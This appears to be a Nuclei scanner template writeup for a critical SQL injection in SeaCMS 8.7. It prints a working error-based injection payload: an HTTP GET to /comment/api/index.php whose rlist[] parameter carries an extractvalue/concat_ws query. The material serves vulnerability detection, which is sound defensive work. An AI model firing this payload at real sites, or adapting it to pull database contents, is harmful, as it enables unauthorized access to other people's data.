# Nuclei Template: SeaCMS 8.7 - SQL Injection
**Template ID:** seacms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`seacms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
SeaCMS 8.7 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`
```

## References
- https://www.uedbox.com/post/54561/
